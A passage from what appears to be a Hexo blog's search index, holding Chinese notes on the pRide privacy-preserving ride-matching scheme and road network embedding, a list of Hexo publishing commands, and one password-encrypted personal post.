<h3 id="一、初始化-Setup"><a href="#一、初始化-Setup" class="headerlink" title="一、初始化   Setup"></a>一、初始化   Setup</h3><p>1.ORH   地图分块(如图1所示)</p>
<p><img src="/2020/01/23/2020-01-23-pRide-optimized-construction/image-20200123162426100.png" alt="图1"></p>
<p>​                                                                                  图  1</p>
<p>2.ORH   计算  地图道路的   路网嵌入向量</p>
<p>3.CP   初始化同态加密公钥并分发</p>
<h3 id="二、司机-位置更新-Location-update"><a href="#二、司机-位置更新-Location-update" class="headerlink" title="二、司机 位置更新   Location-update"></a>二、司机 位置更新   Location-update</h3><p>此步骤主要用于司机上传自己的位置信息（在pRide里是上传自己的路网嵌入信息）</p>
<p>1.司机端   计算自己的路网嵌入变量S</p>
<p>根据从服务器获取的地图道路路网嵌入向量、来在本地计算自己的路网嵌入向量S（这在路网嵌入已经讲过了）</p>
<p>2.司机端   把S打包成一个变量P</p>
<p>就是像进制位一样叠加维度S(如图2)</p>
<p><img src="/2020/01/23/2020-01-23-pRide-optimized-construction/image-20200123162003661.png" alt="图2"></p>
<p>​                                                                                  图  2</p>
<p>3.司机端   把P用从CP获得的公钥加密成[P(b)]，把这个[P(b)]和所处区域Zα上传到ORH</p>
<p>4.ORH   随机生成一个路网嵌入向量u，并加密之成[P(u)]</p>
<p>5.ORH   使用[P(b)]-[P(u)]=&gt;[P(b‘)]</p>
<h3 id="三、乘客-乘车请求-Ride-request"><a href="#三、乘客-乘车请求-Ride-request" class="headerlink" title="三、乘客 乘车请求   Ride-request"></a>三、乘客 乘车请求   Ride-request</h3><p>1.乘客端   把自己的坐标x、y加密为[x]、[y]</p>
<p>2.乘客端   计算自己的路网嵌入向量S、打包、加密之得到[P(a)]</p>
<p>3.乘客端 上传[P(a)]、[x]、[y]、所处区域Zα给ORH</p>
<p>4.ORH   随机生成两随机数ηx、ηy，把其当做一个坐标值，计算其的网嵌入向量S、打包、加密之得到[P(η)]</p>
<p>5.ORH   计算    [P(η)]-[P(a)]=》[P(a’)]       ;        [x]-[ηx]=&gt;[x’]        ;        [y]-[ηy]=&gt;[y’]</p>
<p>《第五步是为了在4.2提高匹配精度的阶段判断坐标，所以把坐标也放到了距离向量中[P(a)]》</p>
<h3 id="四、ORH-乘车匹配-Ride-matching"><a href="#四、ORH-乘车匹配-Ride-matching" class="headerlink" title="四、ORH 乘车匹配   Ride-matching"></a>四、ORH 乘车匹配   Ride-matching</h3><h4 id="4-1-乘客所属区域zα匹配-Local-Zone-matching"><a href="#4-1-乘客所属区域zα匹配-Local-Zone-matching" class="headerlink" title="4.1.乘客所属区域zα匹配    Local Zone matching"></a>4.1.乘客所属区域zα匹配    Local Zone matching</h4><p>1.ORH   计算   [P(d)’]=[P(a)]-[P(b‘)]=[P(a)]-[P(b)]+[P(u)]</p>
<p>2.ORH   将 [P(d)’]发给CP</p>
<p>3.CP   解密 [P(d)’]得到 P(d)’、并且获得其混淆值 ~P(d)’   《这里的混淆电路还不太明白怎么操作的》</p>
<p>4.ORH   通过1-out-of-2 OT protocol 获得[P(u)]的混淆值  ~[P(u)]</p>
<p>5.通过算法2(如图3)判断两个司机哪个离乘客近</p>
<p>算法注释：</p>
<p>第一、二步是计算第一个司机到该乘客的最近距离(把P打包、第二步是找到两个P之间的最大值)</p>
<p>第三、四步同上计算第二个司机到该乘客的最近距离</p>
<p>第五步是判断哪个司机离乘客近</p>
<p><img src="/2020/01/23/2020-01-23-pRide-optimized-construction/image-20200123170731309.png" alt="图3"></p>
<p>​                                                            图  3   上为算法、下为混淆电路</p>
<h4 id="4-2-提高匹配精度-Refinement"><a href="#4-2-提高匹配精度-Refinement" class="headerlink" title="4.2.提高匹配精度   Refinement"></a>4.2.提高匹配精度   Refinement</h4><p>1.ORH   把4.1中计算出来的，乘客所处区域zα与最近司机的[P(d)’] (4.1.1中计算)、</p>
<p>与[x]-[ηx]=&gt;[x’]        ;        [y]-[ηy]=&gt;[y’]都发给CP</p>
<p>2.CP   将其解密并获得混淆值 <del>P(d)’、</del>[x’]、~[y’]</p>
<p>3.ORH   通过1-out-of-2 OT protocol 获得~[P(η)]    ;        ~[ηx]    ;        ~[ηy]</p>
<p>4.通过如下图算法3(如图4)判断其他八块区域za1, za2, za3, za4, za5, za6, za7,za8（具体见图1）是否有需要计算的必要</p>
<p>算法注释：</p>
<p>第四步是计算乘客的坐标x、y</p>
<p>第五、六步是计算第一个司机到该乘客的最近距离(把P打包、第二步是找到两个P之间的最大值)</p>
<p>第七步是计算Γ   Γ是一个8位的二进制数，每一位指示一个区域是否该计算（就是看以该距离为半径的圆是否“触”到了周围区域，具体看图1）</p>
<p>第八步是判断 区域zα4是否该计算，后面9到15步同理，是很简单的距离判断（见图一）</p>
<p><img src="/2020/01/23/2020-01-23-pRide-optimized-construction/image-20200123171733353.png" alt="图4"></p>
<p><img src="/2020/01/23/2020-01-23-pRide-optimized-construction/image-20200123171824965.png" alt="图4"></p>
<p>​                                                            图  4   上为算法、下为混淆电路</p>
<p>5.通过算法3获得有需要计算得必要的其他区域、</p>
<p>然后通过4.1Local Zone matching算法计算该区域中离乘客最近的司机，若该司机到乘客的距离B比乘客到本区域最短距离A小，就刷新最短距离A。最终我们得到距离最近的司机，并且将乘客位置信息发送给他………</p>
]]></content>
      <categories>
        <category>项目记录</category>
      </categories>
      <tags>
        <tag>pRide</tag>
        <tag>项目记录</tag>
      </tags>
  </entry>
  <entry>
    <title>路网嵌入 ROAD NETWORK EMBEDDING</title>
    <url>/2020/01/22/2020-01-22-ROAD-NETWORK-EMBEDDING/</url>
    <content><![CDATA[<p>路网嵌入是一种用来计算最短道路距离的方案，通过记录每个节点（道路之间的交叉口）的信息，把常规的道路用多维空间向量表示，使得每个节点之间的距离更能更有效地被计算。</p>
<a id="more"></a>

<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>路网嵌入是一种用来计算最短道路距离的方案，通过记录每个节点（道路之间的交叉口）的信息，把常规的道路用多维空间向量表示，使得每个节点之间的距离更能更有效地被计算。</p>
<blockquote>
<p>Road Network Embedding (RNE), proposed by Shahabi et al.* [12], is an approach to compute shortest path distance in road networks, which bases on the LLR embedding techniques [19]. RNE transforms a road network into a higher dimensional space by assigning a sketch (i.e., a vector) to every node such that the distance between any two nodes can be efficiently approximated using only their sketches.</p>
</blockquote>
<h3 id="主要步骤"><a href="#主要步骤" class="headerlink" title="主要步骤"></a>主要步骤</h3><p>(1) 设G=(V,E)为路网（road network）</p>
<p>V代表道路之间的交叉节点，E（edge）代表道路。</p>
<p>(2)  V有n个，把V分成<strong>n个子集</strong>如下</p>
<p>V : R = {V1,1, . . . , V1,α, . . . , Vβ,1, . . . , Vβ,α}</p>
<blockquote>
<p>Let n = |V | be the size of the node set V . Define R as a set of O(log2n) reference sets, which are subsets of V : R = {V1,1, . . . , V1,α, . . . , Vβ,1, . . . , Vβ,α}, where α = O(log n) and β = O(log n).</p>
<p> Each subset Vi,ji is defined as a random subset of <em>V</em> with 2<em>i</em> nodes randomly chosen from <em>V</em> . </p>
</blockquote>
<p>(3) 一个节点到一个子集Vij的距离即该节点到这个子集的最近距离所有节点距离的最小值</p>
<blockquote>
<p>The distance between node v and subset Vi,j is defined as dist(v, Vi,j ) = minw∈Vi,j dist(v, w)</p>
</blockquote>
<p>(4) 对于一个节点，把其到每个子集的最短距离记录下来，构成一个S集，这个S集就是该节点的<strong>路网嵌入向量</strong>，然后我们把所有的向量放在一起，构成路网嵌入数据集。</p>
<p><img src="/2020/01/22/2020-01-22-ROAD-NETWORK-EMBEDDING/image-20200122212143074.png" alt="4图"></p>
<p>(5) 假设一个点u，处于节点s和t之间，该节点u到某个子集Vij之间的距离可以如下公式计算，</p>
<p>dist(u，s)为点u到节点s的距离,dist(u,t)同理。</p>
<p><img src="/2020/01/22/2020-01-22-ROAD-NETWORK-EMBEDDING/image-20200122212358662.png" alt="aaa"></p>
<p>(6) 根据上面的分析，对于该点u，我们也可以得到一个<strong>路网嵌入向量</strong>如下</p>
<p><img src="/2020/01/22/2020-01-22-ROAD-NETWORK-EMBEDDING/image-20200122212654581.png" alt="6图"></p>
<p>(7) 最终，我们可以计算任意两点a,b的最短距离</p>
<p><img src="/2020/01/22/2020-01-22-ROAD-NETWORK-EMBEDDING/image-20200122212907442.png" alt></p>
]]></content>
      <categories>
        <category>项目记录</category>
      </categories>
      <tags>
        <tag>pRide</tag>
        <tag>项目记录</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo使用配置记录</title>
    <url>/2020/01/20/2020-01-20-hexo/</url>
    <content><![CDATA[<h1 id="简单的hexo命令"><a href="#简单的hexo命令" class="headerlink" title="简单的hexo命令"></a>简单的hexo命令</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.文章的生成及编辑</span><br><span class="line">hexo new “文章标题”</span><br><span class="line">博客所在路径\source_posts\”下生成一个md文件，文件名称为上面命令行所输入的文章标题</span><br><span class="line"></span><br><span class="line">2.文件发布</span><br><span class="line">hexo g generate</span><br><span class="line"></span><br><span class="line">3.本地测试</span><br><span class="line">hexo s </span><br><span class="line">访问localhost:4000来查看变化</span><br><span class="line"></span><br><span class="line">4.同步到github</span><br><span class="line">hexo d</span><br><span class="line"></span><br><span class="line">5.Hexo更换主题并发布到github</span><br><span class="line">安装hexo-deployer-git自动部署发布工具</span><br><span class="line">npm install hexo-deployer-git  --save</span><br><span class="line">发布到GitHub</span><br><span class="line">输入如下命令：hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br><span class="line"></span><br><span class="line">6.如何一键式发布</span><br><span class="line">hexo clean</span><br><span class="line">hexo g -d</span><br><span class="line">可用以下简化（注意事项：下面的命令中 E:\github_repo\hexo_blog 是我博客的文件夹路径，请替换为你自己博客的路径，在git bash中输入命令）以后可以用hexo fuck来发布了</span><br><span class="line">git config --global alias.fuck &#39;!cd E:\github_repo\hexo_blog;hexo clean;hexo g;hexo d&#39;</span><br><span class="line">git fuck</span><br><span class="line">取消别名</span><br><span class="line">git config --global --unset alias.fuck</span><br></pre></td></tr></table></figure>

<h1 id="简单的markdown语法"><a href="#简单的markdown语法" class="headerlink" title="简单的markdown语法"></a>简单的markdown语法</h1><p><img src="/2020/01/20/2020-01-20-hexo/markdown-program.jpg" alt="markdown语法"></p>
<hr>
<h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p>1.GitHub+Hexo搭建个人博客（包括更改主题）真·从git、node.js从头教起必看</p>
<p><a href="https://blog.csdn.net/qq_37651252/article/details/97024874" target="_blank" rel="noopener">https://blog.csdn.net/qq_37651252/article/details/97024874</a> </p>
<p>2.通过hexo更新github pages博客</p>
<p><a href="https://www.jianshu.com/p/5fe8e618002d" target="_blank" rel="noopener">https://www.jianshu.com/p/5fe8e618002d</a></p>
<p>3.更换主题并且发布</p>
<p><a href="https://www.jianshu.com/p/20e1431abb83" target="_blank" rel="noopener">https://www.jianshu.com/p/20e1431abb83</a></p>
<p>4.Hexo的Next主题详细配置</p>
<p><a href="https://www.jianshu.com/p/3a05351a37dc" target="_blank" rel="noopener">https://www.jianshu.com/p/3a05351a37dc</a></p>
<p>5.初级看板娘</p>
<p><a href="https://blog.csdn.net/weixin_33738982/article/details/89621120" target="_blank" rel="noopener">https://blog.csdn.net/weixin_33738982/article/details/89621120</a></p>
<p>6.进阶版看板娘</p>
<p><a href="https://blog.csdn.net/qq_39610915/article/details/90679768" target="_blank" rel="noopener">https://blog.csdn.net/qq_39610915/article/details/90679768</a></p>
<p>7.Hexo NexT 代码块复制功能</p>
<p><a href="https://www.jianshu.com/p/3e9d614c1e77" target="_blank" rel="noopener">https://www.jianshu.com/p/3e9d614c1e77</a></p>
<p>8.Hexo写博客时的图片问题</p>
<p><a href="https://blog.csdn.net/TimeJjc/article/details/86707165" target="_blank" rel="noopener">https://blog.csdn.net/TimeJjc/article/details/86707165</a></p>
<p>9.Hexo NexT主题中集成gitalk评论系统</p>
<p><a href="https://asdfv1929.github.io/2018/01/20/gitalk/" target="_blank" rel="noopener">https://asdfv1929.github.io/2018/01/20/gitalk/</a></p>
<p>10.Hexo博客提交百度和Google收录</p>
<p><a href="https://www.jianshu.com/p/f8ec422ebd52" target="_blank" rel="noopener">https://www.jianshu.com/p/f8ec422ebd52</a></p>
<p>Hexo优化:创建sitemap站点地图并向Google站长工具提交</p>
<p><a href="https://blog.csdn.net/MobiusStrip/article/details/87258612" target="_blank" rel="noopener">https://blog.csdn.net/MobiusStrip/article/details/87258612</a></p>
<p>Google sitemap 不允许的网址的解决办法</p>
<p><a href="https://alanlee.fun/2017/12/30/google-sitemap/" target="_blank" rel="noopener">https://alanlee.fun/2017/12/30/google-sitemap/</a></p>
<p>11.markdown语法简介</p>
<p><a href="http://www.markdown.cn/" target="_blank" rel="noopener">http://www.markdown.cn/</a></p>
<p>12.更多优化如加载进度条等</p>
<p><a href="https://zhuanlan.zhihu.com/p/85037898" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/85037898</a></p>
<p>13.Hexo添加字数统计、阅读时长</p>
<p><a href="https://blog.csdn.net/weixin_33753003/article/details/86257475" target="_blank" rel="noopener">https://blog.csdn.net/weixin_33753003/article/details/86257475</a></p>
<p>14.Hexo博客NexT主题美化之自定义文章底部版权声明</p>
<p><a href="https://www.jianshu.com/p/93170e7413e9" target="_blank" rel="noopener">https://www.jianshu.com/p/93170e7413e9</a></p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>test2</title>
    <url>/2020/01/15/2020-01-15-jottings/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码错误，请重试。\n Oh, this is an invalid password. Check and try again, please." data-whm="解密内容无法验证，但您仍然可以看看。\n Oh, these decrypted content cannot be verified, but you can still have a look."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="加密文章，需要输入密码访问。</br> Hey, password is required here." /><label>加密文章，需要输入密码访问。</br> Hey, password is required here.</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="5c512988129723b05b60deaeb0ed9343b106a249298349112b000ba7a141bc2d">3ca97d78f325d8283e8195d3b0281fb4cec34f7eaca50a07c83f656fcef3240f487bdf0d3b7a62c440a4227eaecc485f2f4cb90d2f354048ae1dbbba78ea2ea2137ed029f4b03824485186d9e64e44d8578449841b9cbcefaceec98f66707adb9662a675cff46626a7b435996eb9605ddda4a598afef112505ec7ae6a1be578e3277c4ef274d4708cba33f81d2aaf437b69279dd41cabb51f0b746d92cd9e98828134f8e56bdf426d545f026599f4d5f454d5e8cabe5b49489e3d5a339e1a879cfc506540797bc7f92cb24ad36e6f889886cb7176334df9581a8b8bc5d4f417eac51df7bfae86fa38fc327a3809fb73cec71d6d22695991c1b59103f38d9292a4533f947dbd79490904ef24f5eb62ffcde41674bb4916bf4a430f0fc01a4b125196f3922b3e55cbf570b2a2f9630c80f5bf7c3be038eb0a6629d7f330c907b8747ba98761355b590c1f515ae11374942b450fb0613196a3a396600b441fc22eeb235a118a157f86547616168dea74b0a2775b26ad5c1bc6095305d05a12f108b864cdcd4774a852c86d34405af8ec519c5f060ef4269b18bc5b6e9d86adc25308ae1c50e7e38bed7579193b9acce4df0978a778ad5dc7a20ca8ba9f9726f4027ed349d6857f73789fe32a4b7de70d32101f5aac329a42909342b83282b4a38f0868ea9f15085d4653b0a09de89b7d421f4fd4f4a5892695f15b6097183eb3bca95b4a04718ff53a6835aed95cadd1634dc990924525e530467ab49631f9988281fbec974917531651aa715e042c76d6e961e391144eef9ac56d9c06d2003e9916c63e582a324cd853f3d1aa2c6388395832235d14f62f1603bf5bc27d3dc89edbc2e677c1bc940215321b183d672b32057ecbc2bc2216b1a174dfd6c9cede729e1e05ffcd25d610a7d507b573e13f7d3facb3b42da52aa74213e9d25a031d6966ecf545d2788d9ecf3865c7d503272292712a8d7517b509b43adaf21a79c53f9ef862469dc59ae6dfa924d6e38bba70883f96164acbc65f0f268ebbf9c20c5ab10d9f350b754bdbe4297c83a11193173312d81d730c70943a818b4cca8cf8d0f62a7b115acc05674955cba90fbdfe27de8bb383ae8c91f874103dfa1c9ad2b77200d40f0b6c0702ca3f1fdc23cb15c002255dcb57538f4246a59878ae3d58abc71d2ae6ed8484b7cb771aeca313c7339fd10cc2d77942f39042e5dc007ccb01c2c6c69b221f2e705734bfc22b88de45a8296a503a245613439487bc4d8825a2c4bdbb5d0be98cea6f4d4df94f59c229ee8f1a31a8b449ed9fdafb8dd6a32f1b49b6748f560f6e2b51eab35772e8e999d35a4086b0d854ce4d0a606fe3eb8d425042f449993fbf0da43fd9bf828e1242cedb035f9c65a6e67b3203589b3a3bb961d295f161d6c86b8d242564d03e648d46754b7954707024b8e016397c8db339748910bf0e1b011cc0bb002d7e6ede4d36318cd5d7128931a3f42df7ed35550ae32b3e17a144f4902e80156796c6a6dd0840c83dd7c05fecf4b319c5104f18ba995e809505c4b1a17a1454b9ac6af40a2a2f83c05cd6360b26d1bbeea885c8a2438f90185f6ee15eac761442dbff5c46e8014e3cc2800cb3617a6afe15c4a6db008f07f52d1a46fa3b08daff239dddc88b43f146521e0023a2b41ade7ec3879b1a5463487208adf307f587b1a033e031d285fbe27068544ad69ca4efd21131065d314a85e10110181b5a46805e3eee75afabb01422753264a5bf8241dad90bed85f19838be03268e8e24d55f0c58693a50406fba9b3ac558c9c7bd144939a58a5885aa6a62bda8cd2aa23a0d15174a67c725bba6dd8d173b2df63335eb577484a88a258f5e9cb9408ba55c49196fc79f36c2bf07aced72fa775db34b10a73cc8972651473c12f53634e8b19850699ca95a0a8b2a838570c52ac2dc55ad631af4233f5e3eb0b628c8246518608578434c3153076a1da8f288d185b41ae1ab5030baaee841f38363df4e0377318dcd76e6fa10365d254e342dc52a0cb0c79b725e547d71079ca00510febf9b92144c6291cccb1462040c6f30647f0927914d681890a5f96cb324d13212c54357525020942a165f89820e5a47a0f1160ab6bf9032779bfefba3549ffa4f9225bc4cc786d772c62c79a65e0c0562657c4204f4fa33f473464f6f174a7e2e5e4f38dcd4a39087776863e8903a92267a1757520b53ab12d10243bd8c1220c06f45047f31eee4bba2ca6d5243f00c03f6f38268880903a8e8f833df8f9083cd3821385d3052fe88e205b12a376c4e3ecb4f257004dc4415ee0b70d276a3b4593398d901d20549772801f8f154e11310d80826ccc7502519397e83a3b1e0e4df8222cf4e9a9a8e805972f18404191e20aec6cfa0f7584a5e4aa6affc357fd44f08dc8ec5ce90bf7e1a1ed233c1a79c71e1ab9e263cebe26ab2a97f80d15968bbf6ace837e612a92ac4a2392f1cddd45eea6538e76cf9e11b0f80acd935d85c1ef8c5b30a95b145add5e9afa610ff882baec85e8b99bf681a2aa3ba4c7306000a8c0bc67f40c4147492942d0f1c824da72cdf29acdeaa837241b7316aaa3551864c4382c52df5415702aadd7f17f5d0274f662c9eff8688259884db1c65e2456b15d1e0e10f1ed6c367b27d23ee1e898e6b7e8dff7945b8a5f3793703a55f0dd99c7939b159d6cd8f2a8d1207429dddab954d328046f7339033d2ce16e2cdf90c4d5109f769fc05827b24dee48f822f199dfb53c0ba8f88ed84430803a020af1c6db4c5baa9de24826b41ebc713059750134a071618928c537c1b065f8d09dff427769832c8c684947c9a2da206c3d8f9ed936b37bd0e77378845ff60610d63165de6260a2a8b7c6e660992c577673ee4943ea2b6d14c5c3984bee9ce18428de0fc862c7ab98b840cd5ce6da3ed96f4e42b816d18bf8d1dc17cba8bdf19cf642959bb8f4e8fe80fb9c7755f8c9de675226e43181aa15fc66ad7c94555f9a5543b915be2599ab49d523dbe7cd7771a8549bb0bc179df3250252195282c59e5552fca8799fe68b0f3e3d84d113ad919ff30de809fed3706aa25a09e34d951f63e8fda6d146f4d6ccf97751a6109273af564a9a621ecf282413493eff1ce300244a0e4e86d6ac069e2a51c4eb5a74f9bc85a978702698cfdf87a24ad8e9807965b7d3b75d8e1d552a913912bbd86319fdb5b92247ab5fd72f786849e04aee6c6fc60212a89149000e965fab71155f061a39ab642efb3a1f33ac0b8e35af54540c0e553e784769a503529a8cd94d8932271ef345efe464dcaceb6c85b676c48e383259898cfcbe22c2ba3fd1e49facbada32433ec55c47955e192a6d41cbb2d9ba8d74335c6684925658b7c11093bde5243f037e296e137d17290b2862af2260a3108778643202d98c03a9b8e3897d2dbb79998dd9a74ab466cc42bc5c77a35d2bbdc7081ad66a23e4da6e2e22a4f44d7b13093b976317cdbdc3843f314c52ba29a24d4a80c133bdcc72d5118c855ddf31074e9c7deee2cfd2333bdbcfc05a7adfb14c8a68c0f7aab5b7c256ca7edb61c612ffda98c9505a41ec4b1a02d0990ea89dfe1a8f7d12886b5c490623594b78d9bfe179a87f7f4ba0dae4788c45e24f969b43dbbf5b6061e4935fdbc2addf2221003d064064c4ff1b4df8e634c08a5c12555a164232e1a090afa3a35f234de9baa65d4c4b46fde063f0a799bb60d82e9862083dfdacc02bac2f458282a2ed1fd5524322f02265a6839b884336ad87c13635d16d2c28df054ec52b9c1dfd4c6997d1f3736c1a7ac285ab2691825de282c678f8d037d1814c38ddbf7478e9895ff90b122ee4f618e7548a4312bfbb2d0ff1c37ddf24feddca3e6238c5923312f99c24d4b25117b3b492fa64f74f3ff748baa0bb47da8b4b805758a436d14c38294956697f26ca3aa19be1e24d29795b575fe480cdbb73bf6aaaff8b171ebd4ac8ef86d0f98a7020834baf6a0cb684e8cf660a9e4ca2b003d95845ce081179c40632d1584eeca886a9170827d0150e5958577780719d68e367981be2b627e1ed679207dcd03ce89d686a2ed59cd870dce62c655fd81945848c4dfa58fa1c1cfa427d985ab58bbf441c29f03fa30f81297b1702a4366fea3d9fd9704a8716eb6fa4b84402acba34286b1e5b34a562a1decbda4d98752b3488de9230e0bf9c9517b7cf70ccbf8756ee4e0da5f06c14508b2840723cc9e4a65601d23913aed6e98e0c8a206c79d494ea4d927ef14a8a2b21d77bbf679d3beb2f41f3c84ebdc8689b7e0308dea98648b7748e795346d3a26eb8591e5c40470f4bb5f989</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>密文</tag>
        <tag>生活</tag>
      </tags>
  </entry>
</search>
